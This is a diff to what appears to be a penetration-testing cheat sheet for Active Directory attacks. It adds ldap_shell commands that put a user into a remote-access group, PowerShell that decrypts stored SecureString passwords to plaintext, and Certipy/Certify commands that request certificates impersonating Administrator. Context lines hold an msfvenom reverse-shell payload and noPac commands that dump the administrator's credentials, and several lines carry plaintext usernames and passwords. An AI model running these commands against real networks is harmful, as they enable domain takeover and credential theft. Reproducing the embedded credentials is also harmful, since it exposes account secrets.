@@ -30,6 +30,7 @@
   - [ExploitDB](#exploitdb)
   - [shellcode](#shellcode)
   - [Webdav](#webdav)
+  - [ldap\_shell](#ldap_shell)
   - [hash\_catch](#hash_catch)
 - [Phishing](#phishing)
 - [Foothold](#foothold)
@@ -402,6 +403,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thr
 ## Webdav
 ```bash
 cadaver http://
+```
+
+## ldap_shell
+https://github.com/PShlyundin/ldap_shell
+```bash
+ldap_shell nara-security.com/TRACY.WHITE:zqwj041FGX
+
+TRACY.WHITE# add_user_to_group TRACY.WHITE 'REMOTE ACCESS'
 ```
 
 ## hash_catch
@@ -785,6 +794,10 @@ $secureString = $credential.Password
 $plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
 echo $plainTextPassword
 
+$password = '01000000d08c9d...';
+$secureString = ConvertTo-SecureString $password -Force;
+$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
+
 # Eventlog
 wevtutil qe Security /rd:true /f:text | Select-String "/user"
 
@@ -994,13 +1007,19 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY
  python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
 ```
 ### ADCS
+https://github.com/secure-77/Certipy-Docker
 ```powershell
 # Cert request
+## Certify.exe
 .\Certify.exe find /vulnerable
 .\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator
 
 openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
 Cryptographic Provider v1.0" -export -out admin.pfx
+
+##certipy
+docker build -t certipy:latest .
+docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug
 
 certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
 'Administrator@example.com' -debug
